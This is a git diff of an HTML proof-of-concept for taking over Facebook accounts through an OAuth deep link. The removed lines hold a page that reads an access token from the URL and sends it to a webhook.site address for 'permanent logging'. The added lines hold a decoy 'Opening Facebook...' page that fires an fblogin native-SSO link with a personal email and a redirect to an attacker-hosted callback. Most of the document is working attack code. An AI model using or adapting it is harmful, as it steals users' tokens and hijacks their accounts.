@@ -1,36 +1,13 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>PoC Success - Token Captured</title>
-    <style>
-        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
-        .container { border: 1px solid #00ff00; padding: 20px; border-radius: 10px; word-break: break-all; }
-        h1 { color: red; }
-    </style>
+    <title>Opening Facebook...</title>
 </head>
 <body>
-    <h1>AUTHENTICATION TOKEN CAPTURED</h1>
-    <div class="container">
-        <p><strong>Status:</strong> ATO Successful</p>
-        <p><strong>Captured Token:</strong> <span id="token-display">Waiting for redirect...</span></p>
-    </div>
-
+    <p>Redirecting to Facebook, please wait...</p>
     <script>
-        // Extract the token from the URL fragment or query string
-        const urlParams = new URLSearchParams(window.location.search);
-        const fragmentParams = new URLSearchParams(window.location.hash.substring(1));
-        
-        // OAuth tokens often come back in the hash (#access_token=...) 
-        // or a query (?token=...) depending on the client_id config
-        const token = urlParams.get('access_token') || fragmentParams.get('access_token') || urlParams.get('token');
-
-        if (token) {
-            document.getElementById('token-display').innerText = token;
-            
-            // Optional: Also send it to your webhook for permanent logging
-            fetch('https://webhook.site/d5f136cb-a709-4c28-ba8e-2a998bfd9100?captured_token=' + token);
-        }
+        // This is the trigger. As soon as they land here, it fires the deep link.
+        window.location.href = "fblogin://nativesso?contactpoint=alam.sahil507@gmail.com&landing_page=fb%3A%2F%2Fthird_party_oauth%3Fclient_id%3D12345%26redirect_uri%3Dhttps%3A%2F%2Flinux-1723.github.io/test%2Fpoc-page%2Fcallback.html";
     </script>
 </body>
 </html>
